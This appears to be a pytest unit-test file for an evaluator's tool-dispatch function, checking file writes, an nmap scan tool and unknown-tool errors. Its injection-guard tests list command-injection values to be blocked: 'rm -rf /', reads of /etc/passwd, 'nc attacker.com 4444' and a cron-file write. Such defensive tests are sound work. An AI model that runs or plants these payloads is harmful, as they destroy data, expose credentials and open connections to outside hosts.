"""
Unit tests for evaluator._execute_tool_in_env — tool dispatch, return shapes,
injection guard, and unknown-tool fallback.
"""
import pytest
from unittest.mock import MagicMock
from core.evaluator import _execute_tool_in_env


def _env(*, write_result=None, execute_result=None, exists=True, delete_result=True):
    env = MagicMock()
    env.write_file.return_value  = write_result or {"status": "success", "bytes_written": 5}
    env.execute.return_value     = execute_result or {"stdout": "done", "stderr": "", "exit_code": 0}
    env.exists.return_value      = exists
    env.delete_file.return_value = delete_result
    return env


# ── file_creator ──────────────────────────────────────────────────────────────

class TestFileCreator:
    def test_calls_write_file(self):
        env = _env()
        result = _execute_tool_in_env(env, "file_creator",
                                       {"path": "/tmp/x", "content": "hello"})
        env.write_file.assert_called_once_with("/tmp/x", "hello")
        assert result == {"status": "success", "bytes_written": 5}

    def test_missing_args_use_defaults(self):
        env = _env()
        _execute_tool_in_env(env, "file_creator", {})
        env.write_file.assert_called_once_with("", "")

    def test_returns_error_dict_on_failure(self):
        env = _env(write_result={"error": "Permission denied"})
        result = _execute_tool_in_env(env, "file_creator",
                                       {"path": "/root/x", "content": "x"})
        assert "error" in result



# ── run_nmap_scan ─────────────────────────────────────────────────────────────

class TestRunNmapScan:
    def test_calls_execute_with_nmap(self):
        env = _env()
        result = _execute_tool_in_env(env, "run_nmap_scan",
                                       {"target": "127.0.0.1", "arguments": "-F"})
        call_cmd = env.execute.call_args[0][0]
        assert "nmap" in call_cmd
        assert "127.0.0.1" in call_cmd
        assert "-F" in call_cmd

    def test_default_target_and_arguments(self):
        env = _env()
        _execute_tool_in_env(env, "run_nmap_scan", {})
        call_cmd = env.execute.call_args[0][0]
        assert "127.0.0.1" in call_cmd  # default target
        assert "-F" in call_cmd          # default arguments

    @pytest.mark.parametrize("injection", [
        ";rm -rf /",
        "& cat /etc/passwd",
        "| nc attacker.com 4444",
        "`id`",
        "$(whoami)",
        "> /etc/cron.d/evil",
    ])
    def test_injection_chars_blocked(self, injection):
        env = _env()
        result = _execute_tool_in_env(env, "run_nmap_scan",
                                       {"target": f"127.0.0.1{injection}", "arguments": "-F"})
        assert "error" in result
        env.execute.assert_not_called()

    def test_injection_in_arguments_blocked(self):
        env = _env()
        result = _execute_tool_in_env(env, "run_nmap_scan",
                                       {"target": "127.0.0.1",
                                        "arguments": "-F; cat /etc/passwd"})
        assert "error" in result
        env.execute.assert_not_called()


# ── unknown tool ──────────────────────────────────────────────────────────────

class TestUnknownTool:
    def test_returns_error_dict(self):
        env = _env()
        result = _execute_tool_in_env(env, "does_not_exist", {})
        assert "error" in result
        assert "does_not_exist" in result["error"]

    def test_no_env_methods_called(self):
        env = _env()
        _execute_tool_in_env(env, "phantom_tool", {"arg": "val"})
        env.execute.assert_not_called()
        env.write_file.assert_not_called()
        env.delete_file.assert_not_called()
